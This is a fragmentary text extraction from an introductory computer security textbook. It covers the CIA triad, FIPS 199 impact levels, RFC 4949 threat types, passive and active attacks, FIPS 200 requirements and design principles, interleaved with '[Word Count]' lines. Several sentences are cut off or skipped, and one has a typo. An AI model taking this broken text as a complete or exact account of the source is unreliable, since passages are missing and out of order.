[Word Count: 11]

motivations
• Malware
• Denial of service and Distributed
[Word Count: 9]

6—Malicious Software
7—Denial-of-Service Attacks
[Word Count: 4]

• Network specific threats and attack types
• Use of cryptography for data and
[Word Count: 14]

network security
• Architectures for secure networks
• Defense mechanisms and countermeasures
• Security for wireless, cellular networks
[Word Count: 18]

8—Intrusion Detection
9—Firewalls and Intrusion Prevention 
Systems
Part 5—Network Security
[Word Count: 10]

Cryptography (Tier 2)
• Basic cryptography terminology
• Cipher types
• Overview of mathematical preliminaries
• Public key I dnfrastructure
[Word Count: 20]

2—Cryptographic Tools
Part 4—Cryptographic Algorithms
[Word Count: 5]

• Math: Includes a basic math refresher, a queuing analysis primer, a number
[Word Count: 13]

system primer, and links to numerous math sites.
 
• How-to: Advice and guidance for solving homework problems, writing technical
[Word Count: 19]

reports, and preparing technical presentations.
 
• Research resources: Links to important collections of papers, technical
[Word Count: 15]

reports, and bibliographies.
 
• Other useful: A variety of other useful documents and links.
 
• Computer science careers: Useful links and documents for those considering a
[Word Count: 26]

Numerous Web sites provide information related to the topics of this book. The 
Companion Website provides links to these sites, organized by chapter.
[Word Count: 23]

There are a number of worthwhile Web-based forums dealing with aspects of 
computer security. The Companion Web site provides links to these.
[Word Count: 22]

Many of the security techniques and applications described in this book have been 
specified as standards. Additionally, standards have been developed to cover man-
agement practices and the overall architecture of security mechanisms and services. 
Throughout this book, we describe the most important standards in use or that are 
being developed for various aspects of computer security. Various organizations 
have been involved in the development or promotion of these standards. The most 
important (in the current context) of these organizations are as follows:
[Word Count: 83]

• National Institute of Standards and Technology: NIST is a U.S. federal agency
[Word Count: 13]

that deals with measurement science, standards, and technology related to 
U.S. government use and to the promotion of U.S. private sector innovation. 
Despite its national scope, NIST Federal Information Processing Standards 
(FIPS) and Special Publications (SP) have a worldwide impact.
 
• Internet Society: ISOC is a professional membership society with worldwide
[Word Count: 51]

organizational and individual membership. It provides leadership in address-
ing issues that confront the future of the Internet and is the organization home 
for the groups responsible for Internet infrastructure standards, including the 
Internet Engineering Task Force (IETF) and the Internet Architecture Board 
(IAB). These organizations develop Internet standards and related specifica-
tions, all of which are published as Requests for Comments (RFCs).
 
• ITU-T: The International Telecommunication Union (ITU) is an interna-
[Word Count: 73]

tional organization within the United Nations System in which governments 
and the private sector coordinate global telecom networks and services. The 
ITU Telecommunication Standardization Sector (ITU-T) is one of the three 
sectors of the ITU. ITU-T’s mission is the production of standards cover-
ing all fields of telecommunications. ITU-T standards are referred to as 
Recommendations.
[Word Count: 55]

10    Chapter 0 / Reader’s and Instructor’s Guide
[Word Count: 8]

• ISO: The International Organization for Standardization (ISO)1 is a world-
[Word Count: 11]

wide federation of national standards bodies. ISO is a nongovernmental or-
ganization that ­promotes the development of standardization and related 
activities with a view to ­facilitating the international exchange of goods and 
services, and to developing ­cooperation in the spheres of intellectual, scien-
tific, technological, and economic activity. ISO’s work results in international 
agreements that are published as International Standards.
[Word Count: 60]

A more detailed discussion of these organizations is contained in Appendix C.
[Word Count: 12]

1ISO is not an acronym (in which case it would be IOS), but a word, derived from the Greek, meaning 
equal.
[Word Count: 21]

1.1	 Computer Security Concepts
A Definition of Computer Security
Examples
The Challenges of Computer Security
A Model for Computer Security
[Word Count: 20]

1.2	 Threats, Attacks, and Assets
Threats and Attacks
Threats and Assets
[Word Count: 11]

1.4	 Fundamental Security Design Principles
[Word Count: 5]

1.5	 Attack Surfaces and Attack Trees
Attack Surfaces
Attack Trees
[Word Count: 10]

1.6	 Computer Security Strategy
Security Policy
Security Implementation
Assurance and Evaluation
[Word Count: 11]

1.8	 Key Terms, Review Questions, and Problems
[Word Count: 7]

The focus of this chapter, and indeed this book, is on three fundamental 
questions:
[Word Count: 14]

1.	 What assets do we need to protect?
	
2.	 How are those assets threatened?
	
3.	 What can we do to counter those threats?
[Word Count: 23]

The NIST Computer Security Handbook [NIST95] defines the term computer secu-
rity as follows:
[Word Count: 14]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	 Describe the key security requirements of confidentiality, integrity, and
[Word Count: 10]

availability.
◆	 Discuss the types of security threats and attacks that must be dealt with
[Word Count: 15]

and give examples of the types of threats and attacks that apply to different 
­categories of computer and network assets.
◆	 Summarize the functional requirements for computer security.
◆	 Explain the fundamental security design principles.
◆	 Discuss the use of attack surfaces and attack trees.
◆	 Understand the principle aspects of a comprehensive security strategy.
[Word Count: 55]

Computer Security: The protection afforded to an automated information 
­system in order to attain the applicable objectives of preserving the integrity, 
availability, and confidentiality of information system resources (includes hard-
ware, ­software, firmware, information/data, and telecommunications).
[Word Count: 36]

This definition introduces three key objectives that are at the heart of computer 
security:
[Word Count: 14]

• Confidentiality: This term covers two related concepts:
	
	 — Data confidentiality:1 Assures that private or confidential information is
[Word Count: 18]

not made available or disclosed to unauthorized individuals.
	
	 — Privacy: Assures that individuals control or influence what information
[Word Count: 18]

related to them may be collected and stored and by whom and to whom 
that information may be disclosed.
 
• Integrity: This term covers two related concepts:
	
	 — Data integrity: Assures that information and programs are changed only
[Word Count: 38]

in a specified and authorized manner.
	
	 — System integrity: Assures that a system performs its intended function in
[Word Count: 18]

an unimpaired manner, free from deliberate or inadvertent unauthorized 
manipulation of the system.
 
• Availability: Assures that systems work promptly and service is not denied to
[Word Count: 26]

These three concepts form what is often referred to as the CIA triad. The three 
concepts embody the fundamental security objectives for both data and for informa-
tion and computing services. For example, the NIST standard FIPS 199 (Standards 
for Security Categorization of Federal Information and Information Systems) lists 
confidentiality, integrity, and availability as the three security objectives for infor-
mation and for information systems. FIPS 199 ­provides a useful characterization of 
these three objectives in terms of requirements and the definition of a loss of secu-
rity in each category:
[Word Count: 91]

• Confidentiality: Preserving authorized restrictions on information access and
[Word Count: 9]

disclosure, including means for protecting personal privacy and proprietary in-
formation. A loss of confidentiality is the unauthorized disclosure of ­information.
 
• Integrity: Guarding against improper information modification or destruction,
[Word Count: 30]

including ensuring information nonrepudiation and authenticity. A loss of 
integrity is the unauthorized modification or destruction of information.
 
• Availability: Ensuring timely and reliable access to and use of information.
[Word Count: 30]

A loss of availability is the disruption of access to or use of information or an 
information system.
[Word Count: 18]

Although the use of the CIA triad to define security objectives is well estab-
lished, some in the security field feel that additional concepts are needed to present 
a complete picture. Two of the most commonly mentioned are as follows:
[Word Count: 40]

• Authenticity: The property of being genuine and being able to be verified and
[Word Count: 14]

trusted; confidence in the validity of a transmission, a message, or message
[Word Count: 12]

1RFC 4949 defines information as “facts and ideas, which can be represented (encoded) as various forms 
of data,” and data as “information in a specific physical representation, usually a sequence of symbols 
that have meaning; especially a representation of information that can be processed or produced by a 
computer.” Security literature typically does not make much of a distinction; nor does this book.
[Word Count: 63]

originator. This means verifying that users are who they say they are and that 
each input arriving at the system came from a trusted source.
 
• Accountability: The security goal that generates the requirement for actions
[Word Count: 36]

of an entity to be traced uniquely to that entity. This supports nonrepudiation, 
deterrence, fault isolation, intrusion detection and prevention, and after-action 
recovery and legal action. Because truly secure systems are not yet an achiev-
able goal, we must be able to trace a security breach to a responsible party. 
Systems must keep records of their activities to permit later forensic analysis to 
trace security breaches or to aid in transaction disputes.
[Word Count: 72]

Note that FIPS 199 includes authenticity under integrity.
[Word Count: 8]

We now provide some examples of applications that illustrate the requirements just 
enumerated.2 For these examples, we use three levels of impact on organizations or 
individuals should there be a breach of security (i.e., a loss of confidentiality, integrity, 
or availability). These levels are defined in FIPS 199:
[Word Count: 48]

• Low: The loss could be expected to have a limited adverse effect on organiza-
[Word Count: 15]

tional operations, organizational assets, or individuals. A limited adverse ­effect 
means that, for example, the loss of confidentiality, integrity, or availability 
might (i) cause a degradation in mission capability to an extent and duration 
that the organization is able to perform its primary functions, but the effec-
tiveness of the functions is noticeably reduced; (ii) result in minor damage to 
­organizational assets; (iii) result in minor financial loss; or (iv) result in minor 
harm to individuals.
 
• Moderate: The loss could be expected to have a serious adverse effect on
[Word Count: 90]

organizational operations, organizational assets, or individuals. A serious 
adverse effect means that, for example, the loss might (i) cause a significant 
degradation in mission capability to an extent and duration that the organiza-
tion is able to perform its primary functions, but the effectiveness of the func-
tions is significantly reduced; (ii) result in significant damage to organizational 
assets; (iii) result in significant financial loss; or (iv) result in significant harm 
to individuals that does not involve loss of life or serious, life-threatening 
injuries.
 
• High: The loss could be expected to have a severe or catastrophic adverse
[Word Count: 98]

effect on organizational operations, organizational assets, or individuals. A 
­severe or catastrophic adverse effect means that, for example, the loss might 
(i) cause a severe degradation in or loss of mission capability to an extent 
and duration that the organization is not able to perform one or more of its 
­primary functions; (ii) result in major damage to organizational assets; (iii) 
result in major financial loss; or (iv) result in severe or catastrophic harm to 
individuals involving loss of life or serious life-threatening injuries.
[Word Count: 84]

2These examples are taken from a security policy document published by the Information Technology 
Security and Privacy Office at Purdue University.
[Word Count: 21]

An example of an asset that may be assigned a moderate level of integrity 
requirement is a Web site that offers a forum to registered users to discuss some 
specific topic. Either a registered user or a hacker could falsify some entries or 
deface the Web site. If the forum exists only for the enjoyment of the users, brings 
in little or no advertising revenue, and is not used for something important such 
as research, then potential damage is not severe. The Web master may experience 
some data, financial, and time loss.
[Word Count: 92]

An example of a low integrity requirement is an anonymous online poll. Many 
Web sites, such as news organizations, offer these polls to their users with very few 
safeguards. However, the inaccuracy and unscientific nature of such polls is well 
understood.
[Word Count: 41]

Availability  The more critical a component or service, the higher the level of 
availability required. Consider a system that provides authentication services for 
critical systems, applications, and devices. An interruption of service results in 
the inability for customers to access computing resources and staff to access the 
resources they need to perform critical tasks. The loss of the service translates into a 
large financial loss in lost employee productivity and potential customer loss.
[Word Count: 73]

An example of an asset that would typically be rated as having a moderate 
availability requirement is a public Web site for a university; the Web site provides 
information for current and prospective students and donors. Such a site is not a 
critical component of the university’s information system, but its unavailability will 
cause some embarrassment.
[Word Count: 56]

An online telephone directory lookup application would be classified as a low 
availability requirement. Although the temporary loss of the application may be
[Word Count: 23]

an annoyance, there are other ways to access the information, such as a hardcopy 
directory or the operator.
[Word Count: 18]

Computer security is both fascinating and complex. Some of the reasons follow:
[Word Count: 12]

1.	 Computer security is not as simple as it might first appear to the novice. The
[Word Count: 16]

requirements seem to be straightforward; indeed, most of the major require-
ments for security services can be given self-explanatory one-word labels: 
confidentiality, authentication, nonrepudiation, integrity. But the mechanisms 
used to meet those requirements can be quite complex, and understanding 
them may involve rather subtle reasoning.
	
2.	 In developing a particular security mechanism or algorithm, one must always
[Word Count: 57]

consider potential attacks on those security features. In many cases, successful 
attacks are designed by looking at the problem in a completely different way, 
therefore exploiting an unexpected weakness in the mechanism.
	
3.	 Because of point 2, the procedures used to provide particular services are
[Word Count: 45]

often counterintuitive. Typically, a security mechanism is complex, and it is 
not obvious from the statement of a particular requirement that such elaborate 
­measures are needed. It is only when the various aspects of the threat are  
considered that elaborate security mechanisms make sense.
	
4.	 Having designed various security mechanisms, it is necessary to decide
[Word Count: 55]

where to use them. This is true both in terms of physical placement (e.g., at 
what points in a network are certain security mechanisms needed) and in a 
logical sense [e.g., at what layer or layers of an architecture such as TCP/IP 
(Transmission Control Protocol/Internet Protocol) should mechanisms be 
placed].
	
5.	 Security mechanisms typically involve more than a particular algorithm or
[Word Count: 61]

tries to find holes and the designer or administrator who tries to close them. 
The great advantage that the attacker has is that he or she need only find a 
single weakness while the designer must find and eliminate all weaknesses to 
achieve perfect security.
	
7.	 There is a natural tendency on the part of users and system managers to
[Word Count: 60]

­perceive little benefit from security investment until a security failure 
occurs.
[Word Count: 11]

8.	 Security requires regular, even constant, monitoring, and this is difficult in
[Word Count: 12]

today’s short-term, overloaded environment.
	
9.	 Security is still too often an afterthought to be incorporated into a system
[Word Count: 18]

after the design is complete rather than being an integral part of the design 
process.
	 10.	 Many users and even security administrators view strong security as an imped-
[Word Count: 28]

iment to efficient and user-friendly operation of an information system or use 
of information.
[Word Count: 14]

The difficulties just enumerated will be encountered in numerous ways as we 
examine the various security threats and mechanisms throughout this book.
[Word Count: 22]

We now introduce some terminology that will be useful throughout the book, rely-
ing on RFC 4949, Internet Security Glossary.3 Table 1.1 defines terms and Figure 1.1, 
based on [CCPS12a], shows the relationship among some of these terms. We start
[Word Count: 40]

3See Chapter 0 for an explanation of RFCs.
[Word Count: 8]

Table 1.1  Computer Security Terminology
[Word Count: 5]

Source: From RFC 4949, Internet Security Glossary, May 2000
[Word Count: 9]

with the concept of a system resource, or asset, that users and owners wish to pro-
tect. The assets of a computer system can be categorized as follows:
[Word Count: 28]

• Hardware: Including computer systems and other data processing, data storage,
[Word Count: 11]

and data communications devices
 
• Software: Including the operating system, system utilities, and applications.
 
• Data: Including files and databases, as well as security-related data, such as
[Word Count: 27]

password files.
 
• Communication facilities and networks: Local and wide area network
[Word Count: 12]

­communication links, bridges, routers, and so on.
[Word Count: 7]

In the context of security, our concern is with the vulnerabilities of system 
resources. [NRC02] lists the following general categories of vulnerabilities of a 
­computer system or network asset:
[Word Count: 29]

• It can be corrupted, so that it does the wrong thing or gives wrong answers.
[Word Count: 16]

For example, stored data values may differ from what they should be because 
they have been improperly modified.
 
• It can become leaky. For example, someone who should not have access to
[Word Count: 32]

some or all of the information available through the network obtains such 
access.
 
• It can become unavailable or very slow. That is, using the system or network
[Word Count: 28]

These three general types of vulnerability correspond to the concepts of integrity, 
confidentiality, and availability, enumerated earlier in this section.
[Word Count: 20]

Corresponding to the various types of vulnerabilities to a system resource are 
threats that are capable of exploiting those vulnerabilities. A threat represents a 
potential security harm to an asset. An attack is a threat that is carried out (threat
[Word Count: 40]

Figure 1.1  Security Concepts and Relationships
[Word Count: 6]

action) and, if successful, leads to an undesirable violation of security, or threat 
­consequence. The agent carrying out the attack is referred to as an attacker, or 
threat agent. We can distinguish two types of attacks:
[Word Count: 36]

• Active attack: An attempt to alter system resources or affect their operation.
 
• Passive attack: An attempt to learn or make use of information from the sys-
[Word Count: 28]

tem that does not affect system resources.
[Word Count: 7]

We can also classify attacks based on the origin of the attack:
[Word Count: 12]

• Inside attack: Initiated by an entity inside the security perimeter (an ­“insider”).
[Word Count: 13]

The insider is authorized to access system resources but uses them in a way not 
approved by those who granted the authorization.
 
• Outside attack: Initiated from outside the perimeter, by an unauthorized or
[Word Count: 34]

illegitimate user of the system (an “outsider”). On the Internet, potential 
­outside attackers range from amateur pranksters to organized criminals, inter-
national terrorists, and hostile governments.
[Word Count: 26]

We now turn to a more detailed look at threats, attacks, and assets. First, we look at 
the types of security threats that must be dealt with, and then give some examples of 
the types of threats that apply to different categories of assets.
[Word Count: 44]

Table 1.2, based on RFC 4949, describes four kinds of threat consequences and lists 
the kinds of attacks that result in each consequence.
[Word Count: 23]

Unauthorized disclosure is a threat to confidentiality. The following types of 
attacks can result in this threat consequence:
[Word Count: 18]

• Exposure: This can be deliberate, as when an insider intentionally releases
[Word Count: 12]

sensitive information, such as credit card numbers, to an outsider. It can also 
be the result of a human, hardware, or software error, which results in an ­entity 
gaining unauthorized knowledge of sensitive data. There have been numerous 
instances of this, such as universities accidentally posting student confidential 
information on the Web.
[Word Count: 52]

• Interception: Interception is a common attack in the context of communica-
[Word Count: 12]

tions. On a shared local area network (LAN), such as a wireless LAN or a 
broadcast Ethernet, any device attached to the LAN can receive a copy of 
packets intended for another device. On the Internet, a determined hacker 
can gain access to e-mail traffic and other data transfers. All of these situations 
­create the potential for unauthorized access to data.
[Word Count: 61]

• Inference: An example of inference is known as traffic analysis, in which an
[Word Count: 14]

adversary is able to gain information from observing the pattern of traffic on 
a network, such as the amount of traffic between particular pairs of hosts on 
the network. Another example is the inference of detailed information from 
a database by a user who has only limited access; this is accomplished by 
repeated queries whose combined results enable inference.
 
• Intrusion: An example of intrusion is an adversary gaining unauthorized
[Word Count: 70]

­access to sensitive data by overcoming the system’s access control protections.
[Word Count: 11]

Table 1.2  Threat Consequences, and the Types of Threat Actions that Cause Each Consequence
[Word Count: 14]

Threat Consequence
Threat Action (Attack)
[Word Count: 5]

A circumstance or event whereby 
an entity gains access to data for 
which the entity is not authorized.
[Word Count: 18]

Exposure: Sensitive data are directly released to an unauthorized
[Word Count: 9]

entity.
Interception: An unauthorized entity directly accesses sensitive
[Word Count: 8]

data traveling between authorized sources and destinations.
Inference: A threat action whereby an unauthorized entity
[Word Count: 15]

­indirectly accesses sensitive data (but not necessarily the 
data ­contained in the communication) by reasoning from 
­characteristics or by-products of communications.
[Word Count: 21]

Intrusion: An unauthorized entity gains access to sensitive data
[Word Count: 9]

by circumventing a system’s security protections.
[Word Count: 6]

A circumstance or event that 
may result in an authorized entity 
receiving false data and believing it 
to be true.
[Word Count: 20]

Masquerade: An unauthorized entity gains access to a system or
[Word Count: 10]

performs a malicious act by posing as an authorized entity.
Falsification: False data deceive an authorized entity.
Repudiation: An entity deceives another by falsely denying
[Word Count: 25]

A circumstance or event that 
interrupts or prevents the correct 
operation of system services and 
functions.
[Word Count: 16]

Incapacitation: Prevents or interrupts system operation by
[Word Count: 7]

­disabling a system component.
Corruption: Undesirably alters system operation by adversely
[Word Count: 11]

modifying system functions or data.
Obstruction: A threat action that interrupts delivery of system
[Word Count: 14]

­services by hindering system operation.
[Word Count: 5]

A circumstance or event that results 
in control of system services or 
functions by an unauthorized entity.
[Word Count: 17]

Misappropriation: An entity assumes unauthorized logical or
[Word Count: 7]

­physical control of a system resource.
Misuse: Causes a system component to perform a function or
[Word Count: 16]

­service that is detrimental to system security.
[Word Count: 7]

Deception is a threat to either system integrity or data integrity. The following 
types of attacks can result in this threat consequence:
[Word Count: 22]

• Masquerade: One example of masquerade is an attempt by an unauthorized
[Word Count: 12]

user to gain access to a system by posing as an authorized user; this could 
­happen if the unauthorized user has learned another user’s logon ID and pass-
word. Another example is malicious logic, such as a Trojan horse, that appears 
to perform a useful or desirable function but actually gains unauthorized ac-
cess to system resources or tricks a user into executing other ­malicious logic.
 
• Falsification: This refers to the altering or replacing of valid data or the intro-
[Word Count: 81]

duction of false data into a file or database. For example, a student may alter 
his or her grades on a school database.
 
• Repudiation: In this case, a user either denies sending data or a user denies
[Word Count: 38]

Disruption is a threat to availability or system integrity. The following types of 
attacks can result in this threat consequence:
[Word Count: 20]

• Incapacitation: This is an attack on system availability. This could occur as a
[Word Count: 14]

result of physical destruction of or damage to system hardware. More typically, 
malicious software, such as Trojan horses, viruses, or worms, could operate in 
such a way as to disable a system or some of its services.
 
• Corruption: This is an attack on system integrity. Malicious software in this
[Word Count: 50]

context could operate in such a way that system resources or services ­function 
in an unintended manner. Or a user could gain unauthorized access to a ­system 
and modify some of its functions. An example of the latter is a user placing 
backdoor logic in the system to provide subsequent access to a system and its 
resources by other than the usual procedure.
 
• Obstruction: One way to obstruct system operation is to interfere with com-
[Word Count: 76]

munications by disabling communication links or altering communication 
control information. Another way is to overload the system by placing excess 
burden on communication traffic or processing resources.
[Word Count: 27]

Usurpation is a threat to system integrity. The following types of attacks can 
result in this threat consequence:
[Word Count: 18]

• Misappropriation: This can include theft of service. An example is a distributed
[Word Count: 13]

denial of service attack, when malicious software is installed on a number of hosts 
to be used as platforms to launch traffic at a target host. In this case, the malicious 
software makes unauthorized use of processor and operating system resources.
 
• Misuse: Misuse can occur by means of either malicious logic or a hacker that
[Word Count: 56]

has gained unauthorized access to a system. In either case, security functions 
can be disabled or thwarted.
[Word Count: 17]

The assets of a computer system can be categorized as hardware, software, data, 
and communication lines and networks. In this subsection, we briefly describe these
[Word Count: 25]

four categories and relate these to the concepts of integrity, confidentiality, and 
availability introduced in Section 1.1 (see Figure 1.2 and Table 1.3).
[Word Count: 23]

Hardware  A major threat to computer system hardware is the threat to 
availability. Hardware is the most vulnerable to attack and the least susceptible to 
automated controls. Threats include accidental and deliberate damage to equipment 
as well as theft. The proliferation of personal computers and workstations and the 
widespread use of LANs increase the potential for losses in this area. Theft of 
CD-ROMs and DVDs can lead to loss of confidentiality. Physical and administrative 
security measures are needed to deal with these threats.
[Word Count: 83]

Access to the computer
facility must be controlled
[Word Count: 8]

Figure 1.2  Scope of Computer Security
Note: This figure depicts security concerns other than physical security, including controlling of 
access to computers systems, safeguarding of data transmitted over communications systems, and 
safeguarding of stored data.
[Word Count: 35]

certain countermeasures are available, by and large the problem of unauthorized 
copying of software has not been solved.
[Word Count: 18]

Data  Hardware and software security are typically concerns of computing center 
professionals or individual concerns of personal computer users. A much more 
widespread problem is data security, which involves files and other forms of data 
controlled by individuals, groups, and business organizations.
[Word Count: 42]

Security concerns with respect to data are broad, encompassing availability, 
secrecy, and integrity. In the case of availability, the concern is with the destruction 
of data files, which can occur either accidentally or maliciously.
[Word Count: 34]

Finally, data integrity is a major concern in most installations. Modifications 
to data files can have consequences ranging from minor to disastrous.
[Word Count: 22]

Table 1.3  Computer and Network Assets, with Examples of Threats
[Word Count: 10]

Hardware
Equipment is stolen or 
disabled, thus denying 
service.
[Word Count: 9]

An unencrypted 
CD-ROM or DVD is 
stolen.
[Word Count: 7]

Software
Programs are deleted, 
denying access to users.
[Word Count: 8]

An unauthorized copy of 
software is made.
[Word Count: 7]

A working program is modi-
fied, either to cause it to fail 
during execution or to cause 
it to do some unintended task.
[Word Count: 23]

Data
Files are deleted,  
denying access to users.
[Word Count: 8]

An unauthorized read 
of data is performed. An 
analysis of statistical data 
reveals underlying data.
[Word Count: 15]

Existing files are modified or 
new files are fabricated.
[Word Count: 9]

Messages are destroyed or 
deleted. Communication 
lines or networks are  
rendered unavailable.
[Word Count: 12]

Messages are read. The 
traffic pattern of  
messages is observed.
[Word Count: 10]

Messages are modified, 
delayed, reordered, or dupli-
cated. False messages are 
fabricated.
[Word Count: 12]

Communication Lines and Networks  Network security attacks can be classified 
as passive attacks and active attacks. A passive attack attempts to learn or make 
use of information from the system but does not affect system resources. An active 
attack attempts to alter system resources or affect their operation.
[Word Count: 48]

Passive attacks are in the nature of eavesdropping on, or monitoring of, trans-
missions. The goal of the attacker is to obtain information that is being transmitted. 
Two types of passive attacks are the release of message contents and traffic analysis.
[Word Count: 41]

The release of message contents is easily understood. A telephone conver-
sation, an electronic mail message, and a transferred file may contain sensitive or 
confidential information. We would like to prevent an opponent from learning the 
contents of these transmissions.
[Word Count: 40]

Passive attacks are very difficult to detect because they do not involve any 
alteration of the data. Typically, the message traffic is sent and received in an 
apparently normal fashion and neither the sender nor receiver is aware that a 
third party has read the messages or observed the traffic pattern. However, it is 
feasible to prevent the success of these attacks, usually by means of encryption. 
Thus, the emphasis in dealing with passive attacks is on prevention rather than 
detection.
[Word Count: 81]

Active attacks involve some modification of the data stream or the creation 
of a false stream and can be subdivided into four categories: replay, masquerade, 
modification of messages, and denial of service.
[Word Count: 32]

Replay involves the passive capture of a data unit and its subsequent retrans-
mission to produce an unauthorized effect.
[Word Count: 19]

A masquerade takes place when one entity pretends to be a different entity. A 
masquerade attack usually includes one of the other forms of active attack. For exam-
ple, authentication sequences can be captured and replayed after a valid authentica-
tion sequence has taken place, thus enabling an authorized entity with few privileges 
to obtain extra privileges by impersonating an entity that has those privileges.
[Word Count: 65]

Modification of messages simply means that some portion of a legitimate 
­message is altered, or that messages are delayed or reordered, to produce an 
­unauthorized effect. For example, a message stating, “Allow John Smith to read 
confidential file accounts” is modified to say, “Allow Fred Brown to read confiden-
tial file accounts.”
[Word Count: 52]

The denial of service prevents or inhibits the normal use or management of 
communication facilities. This attack may have a specific target; for example, an 
entity may suppress all messages directed to a particular destination (e.g., the ­security 
audit service). Another form of service denial is the disruption of an entire network,
[Word Count: 52]

1.3 / Security Functional Requirements   25
[Word Count: 6]

either by disabling the network or by overloading it with messages so as to degrade 
performance.
[Word Count: 16]

Active attacks present the opposite characteristics of passive attacks. Whereas 
passive attacks are difficult to detect, measures are available to prevent their ­success. 
On the other hand, it is quite difficult to prevent active attacks absolutely, because 
to do so would require physical protection of all communication facilities and paths 
at all times. Instead, the goal is to detect them and to recover from any disruption 
or delays caused by them. Because the detection has a deterrent effect, it may also 
contribute to prevention.
[Word Count: 84]

The requirements listed in FIPS 200 encompass a wide range of counter-
measures to security vulnerabilities and threats. Roughly, we can divide these coun-
termeasures into two categories: those that require computer security technical 
­measures (covered in this book in Parts One and Two), either hardware or software, 
or both; and those that are fundamentally management issues (covered in Part Three).
[Word Count: 61]

Each of the functional areas may involve both computer security techni-
cal measures and management measures. Functional areas that primarily require 
­computer security technical measures include access control, identification and 
authentication, system and communication protection, and system and information 
integrity. Functional areas that primarily involve management controls and proce-
dures include awareness and training; audit and accountability; certification, accredi-
tation, and security assessments; contingency planning; maintenance; physical and 
environmental protection; planning; personnel security; risk assessment; and systems 
and services acquisition. Functional areas that overlap computer security technical 
measures and management controls include configuration management, incident 
response, and media protection.
[Word Count: 99]

Note that the majority of the functional requirements areas in FIPS 200 are 
either primarily issues of management or at least have a significant management 
component, as opposed to purely software or hardware solutions. This may be new 
to some readers and is not reflected in many of the books on computer and informa-
tion security. But as one computer security expert observed, “If you think technology 
can solve your security problems, then you don’t understand the problems and you
[Word Count: 80]

Access Control: Limit information system access to authorized users, processes acting on behalf of authorized 
users, or devices (including other information systems) and to the types of transactions and functions that 
authorized users are permitted to exercise.
[Word Count: 37]

Awareness and Training: (i) Ensure that managers and users of organizational information systems are made 
aware of the security risks associated with their activities and of the applicable laws, regulation, and policies 
related to the security of organizational information systems; and (ii) ensure that personnel are adequately 
trained to carry out their assigned information security-related duties and responsibilities.
[Word Count: 58]

Audit and Accountability: (i) Create, protect, and retain information system audit records to the 
extent needed to enable the monitoring, analysis, investigation, and reporting of unlawful, unauthorized,  
or inappropriate information system activity; and (ii) ensure that the actions of individual information  
system users can be uniquely traced to those users so they can be held accountable for their  
actions.
[Word Count: 59]

Certification, Accreditation, and Security Assessments: (i) Periodically assess the security controls in 
­organizational information systems to determine if the controls are effective in their application; (ii) develop 
and implement plans of action designed to correct deficiencies and reduce or eliminate vulnerabilities in  
organizational information systems; (iii) authorize the operation of organizational information systems and any 
associated information system connections; and (iv) monitor information system security controls on an  
ongoing basis to ensure the continued effectiveness of the controls.
[Word Count: 78]

Configuration Management: (i) Establish and maintain baseline configurations and inventories of 
organizational information systems (including hardware, software, firmware, and documentation)  
throughout the respective system development life cycles; and (ii) establish and enforce security  
configuration settings for information technology products employed in organizational information  
systems.
[Word Count: 44]

Contingency Planning: Establish, maintain, and implement plans for emergency response, backup opera-
tions, and postdisaster recovery for organizational information systems to ensure the availability of critical 
­information resources and continuity of operations in emergency situations.
[Word Count: 35]

Identification and Authentication: Identify information system users, processes acting on behalf of users, or 
devices, and authenticate (or verify) the identities of those users, processes, or devices, as a prerequisite to 
allowing access to organizational information systems.
[Word Count: 37]

Incident Response: (i) Establish an operational incident-handling capability for organizational information 
­systems that includes adequate preparation, detection, analysis, containment, recovery, and user-response 
activities; and (ii) track, document, and report incidents to appropriate organizational officials and/or 
­authorities.
[Word Count: 36]

Maintenance: (i) Perform periodic and timely maintenance on organizational information systems; and (ii) 
provide effective controls on the tools, techniques, mechanisms, and personnel used to conduct information 
system maintenance.
[Word Count: 29]

Media Protection: (i) Protect information system media, both paper and digital; (ii) limit access to informa-
tion on information system media to authorized users; and (iii) sanitize or destroy information system media 
before disposal or release for reuse.
[Word Count: 38]

Physical and Environmental Protection: (i) Limit physical access to information systems, equipment, and 
the respective operating environments to authorized individuals; (ii) protect the physical plant and support 
infrastructure for information systems; (iii) provide supporting utilities for information systems; (iv) protect 
information systems against environmental hazards; and (v) provide appropriate environmental controls in 
facilities containing information systems.
[Word Count: 56]

Planning: Develop, document, periodically update, and implement security plans for organizational informa-
tion systems that describe the security controls in place or planned for the information systems and the rules 
of behavior for individuals accessing the information systems.
[Word Count: 38]

1.4 / Fundamental Security Design Principles   27
[Word Count: 7]

don’t technology” [SCHN00]. This book reflects the need to combine technical and 
managerial approaches to achieve effective computer security.
[Word Count: 19]

FIPS 200 provides a useful summary of the principal areas of concern, both 
technical and managerial, with respect to computer security. This book attempts to 
cover all of these areas.
[Word Count: 30]

1.4	 Fundamental Security Design Principles
[Word Count: 5]

Despite years of research and development, it has not been possible to develop 
security design and implementation techniques that systematically exclude security 
flaws and prevent all unauthorized actions. In the absence of such foolproof tech-
niques, it is useful to have a set of widely agreed design principles that can guide 
the development of protection mechanisms. The National Centers of Academic 
Excellence in Information Assurance/Cyber Defense, which is jointly sponsored by 
the U.S. National Security Agency and the U. S. Department of Homeland Security, 
list the following as fundamental security design principles [NCAE13]:
[Word Count: 93]

• Economy of mechanism
 
• Fail-safe defaults
 
• Complete mediation
 
• Open design
[Word Count: 13]

Personnel Security: (i) Ensure that individuals occupying positions of responsibility within organizations 
(including third-party service providers) are trustworthy and meet established security criteria for those 
­positions; (ii) ensure that organizational information and information systems are protected during and after 
personnel actions such as terminations and transfers; and (iii) employ formal sanctions for personnel failing to 
comply with organizational security policies and procedures.
[Word Count: 62]

Risk Assessment: Periodically assess the risk to organizational operations (including mission, functions, 
image, or reputation), organizational assets, and individuals, resulting from the operation of organizational 
information systems and the associated processing, storage, or transmission of organizational information.
[Word Count: 37]

Systems and Services Acquisition: (i) Allocate sufficient resources to adequately protect organizational 
information systems; (ii) employ system development life cycle processes that incorporate information 
­security considerations; (iii) employ software usage and installation restrictions; and (iv) ensure that third-
party providers employ adequate security measures to protect information, applications, and/or services 
­outsourced from the organization.
[Word Count: 54]

System and Communications Protection: (i) Monitor, control, and protect organizational communications 
(i.e., information transmitted or received by organizational information systems) at the external boundaries 
and key internal boundaries of the information systems; and (ii) employ architectural designs, software devel-
opment techniques, and systems engineering principles that promote effective information security within 
organizational information systems.
[Word Count: 54]

System and Information Integrity: (i) Identify, report, and correct information and information system flaws 
in a timely manner; (ii) provide protection from malicious code at appropriate locations within organizational 
information systems; and (iii) monitor information system security alerts and advisories and take appropriate 
actions in response.
[Word Count: 46]

• Separation of privilege
 
• Least privilege
 
• Least common mechanism
 
• Psychological acceptability
 
• Isolation
